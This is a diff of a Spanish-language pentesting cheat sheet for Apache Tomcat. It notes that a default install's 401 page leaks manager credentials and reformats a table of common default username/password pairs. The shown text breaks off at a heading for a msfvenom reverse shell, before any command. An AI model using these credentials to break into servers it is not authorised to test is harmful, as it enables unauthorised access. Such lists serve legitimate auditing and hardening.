@@ -4,33 +4,33 @@
 Con una instalación por defecto de tomcat, al intentar entrar al panel de administración, si no sabemos la contraseña, al pulsar en **cancel**, por defecto nos redirige a un fichero que dice: **401 Unauthorized** y más abajo nos muestra el **usuario y contraseña**
 
 ### Credenciales por defecto
-|Username     |Password  |
-|-------------|----------|
-|admin        |password  |
-|admin        |<blank>   |
-|admin        |Password1 |
-|admin        |password1 |
-|admin        |admin     |
-|admin        |tomcat    |
-|both         |tomcat    |
-|manager      |manager   |
-|role1        |role1     |
-|role1        |tomcat    |
-|role         |changethis|
-|root         |Password1 |
-|root         |changethis|
-|root         |password  |
-|root         |password1 |
-|root         |r00t      |
-|root         |root      |
-|root         |toor      |
-|tomcat       |tomcat    |
-|tomcat       |s3cret    |
-|tomcat       |password1 |
-|tomcat       |password  |
-|tomcat       |<blank>   |
-|tomcat       |admin     |
-|tomcat       |changethis|
+| Username | Password   |
+| -------- | ---------- |
+| admin    | password   |
+| admin    | <blank>    |
+| admin    | Password1  |
+| admin    | password1  |
+| admin    | admin      |
+| admin    | tomcat     |
+| both     | tomcat     |
+| manager  | manager    |
+| role1    | role1      |
+| role1    | tomcat     |
+| role     | changethis |
+| root     | Password1  |
+| root     | changethis |
+| root     | password   |
+| root     | password1  |
+| root     | r00t       |
+| root     | root       |
+| root     | toor       |
+| tomcat   | tomcat     |
+| tomcat   | s3cret     |
+| tomcat   | password1  |
+| tomcat   | password   |
+| tomcat   | <blank>    |
+| tomcat   | admin      |
+| tomcat   | changethis |
 ### Reverse shell tomcat con msfvenom
 #### Método 1
 ```bash
